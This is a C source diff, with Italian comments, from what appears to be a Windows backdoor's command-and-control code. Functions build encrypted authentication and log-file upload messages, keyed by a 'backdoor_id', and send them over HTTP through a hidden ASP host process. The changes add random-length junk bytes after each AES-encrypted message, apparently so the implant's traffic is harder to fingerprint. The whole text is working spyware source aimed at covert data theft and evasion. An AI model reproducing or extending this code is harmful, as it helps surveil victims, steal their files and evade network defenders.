@@ -97,6 +97,13 @@ WCHAR *wRequest_array[] = {
 		L"/search.php"
 	};
 
+/*
+#define REQUEST_ARRAY_LEN 1
+WCHAR *wRequest_array[] = {
+		L"/"
+	};
+*/
+
 HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
 ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
 HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
@@ -434,10 +441,15 @@ BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_le
 	DWORD tot_len, pad_len, i;
 	BYTE *buffer, *ptr;
 	aes_context crypt_ctx;
+	DWORD rand_pad_len = 0;
 	BYTE iv[16];
 
 	if (ret_len)
 		*ret_len = 0;
+
+	rand_pad_len = rand()%16;
+	// XXX-Padding
+	// rand_pad_len = 0;
 
 	// arrotonda 
 	pad_len = tot_len = sizeof(DWORD) + msg_len + SHA_DIGEST_LENGTH;
@@ -446,7 +458,7 @@ BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_le
 	tot_len*=16;
 	pad_len = tot_len - pad_len;
 
-	if (!(buffer = (BYTE *)malloc(tot_len)))
+	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len)))
 		return NULL;
 
 	SHA1Reset(&sha);
@@ -474,10 +486,10 @@ BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_le
 	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
-
+	rand_bin_seq(buffer + tot_len, rand_pad_len);
 
 	if (ret_len)
-		*ret_len = tot_len;
+		*ret_len = tot_len + rand_pad_len;
 	return buffer;
 }
 
@@ -494,9 +506,14 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	DWORD command = PROTO_LOG;
 	HANDLE hfile;
 	DWORD n_read;
+	DWORD rand_pad_len = 0;
 
 	if (ret_len)
 		*ret_len = 0;
+
+	rand_pad_len = rand()%16;
+	// XXX-Padding
+	// rand_pad_len = 0;
 
 	// Legge la lunghezza del body del file
 	hfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
@@ -516,7 +533,7 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	pad_len = tot_len - pad_len;
 
 	// alloca il buffer
-	if (!(buffer = (BYTE *)malloc(tot_len))) {
+	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len))) {
 		CloseHandle(hfile);
 		return NULL;
 	}
@@ -557,9 +574,10 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
+	rand_bin_seq(buffer + tot_len, rand_pad_len);
 
 	if (ret_len)
-		*ret_len = tot_len;
+		*ret_len = tot_len + rand_pad_len;
 	return buffer;
 }
 
@@ -726,10 +744,11 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 // Funzioni che eseguono i comandi del core //
 //////////////////////////////////////////////
 
+#define AUTH_REAL_LEN 112
 // Esegue il passi di AUTH
 BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len, char *instance, DWORD inst_len, char *subtype, DWORD sub_len, char *conf_key, DWORD ckey_len, DWORD *response_command)
 {
-	BYTE buffer[112];
+	BYTE buffer[AUTH_REAL_LEN+16];
 	BYTE *response;
 	BYTE *ptr;
 	BYTE client_key[16];
@@ -741,6 +760,7 @@ BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len
 	DWORD i;
 	BYTE iv[16];
 	aes_context crypt_ctx;
+	DWORD rand_pad_len = 0;
 
 	*response_command = PROTO_NO;
 
@@ -784,15 +804,19 @@ BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len
 		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
 	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));
 	ptr+=SHA_DIGEST_LENGTH;
-	memset(ptr, 8, sizeof(buffer)-(ptr-buffer)); // Padda fino alla fine con 8
+	memset(ptr, 8, AUTH_REAL_LEN-(ptr-buffer)); // Padda fino alla fine con 8
 
 	// Cifra il buffer
 	aes_set_key( &crypt_ctx, (BYTE *)signature, 128);
 	memset(iv, 0, sizeof(iv));
-	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, sizeof(buffer));
+	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, AUTH_REAL_LEN);
+	rand_pad_len = rand()%16;
+	// XXX-Padding
+	// rand_pad_len = 0;
+	rand_bin_seq(buffer+AUTH_REAL_LEN, rand_pad_len);
 
 	// Invia la richiesta
-	if (!HttpTransaction(buffer, sizeof(buffer), &response, &response_len, WIRESPEED))
+	if (!HttpTransaction(buffer, AUTH_REAL_LEN + rand_pad_len, &response, &response_len, WIRESPEED))
 		return FALSE;
 
 	// Parsa la prima parte della reply
